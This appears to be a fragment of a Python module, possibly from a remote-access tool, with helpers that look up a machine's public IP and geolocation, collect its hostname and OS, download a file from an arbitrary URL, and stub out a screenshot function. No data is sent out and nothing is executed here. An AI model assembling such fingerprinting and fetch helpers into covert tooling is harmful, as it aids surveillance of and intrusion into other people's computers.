from socket import gethostname
from requests import get
from pyautogui import screenshot
import json, platform

def get_ip():
    return get('https://api.ipify.org').content.decode()

def get_information():
    info = json.loads(get('http://ipinfo.io/json').content.decode())
    info["hostname"] = gethostname()
    info["os"] = platform.system()+" "+platform.release()
    return info

def download_file(url):
    file = get(url).content
    return file if type(file) == bytes else file.encode()

def get_screenshot():
    #screenshot().save()
    return "pes"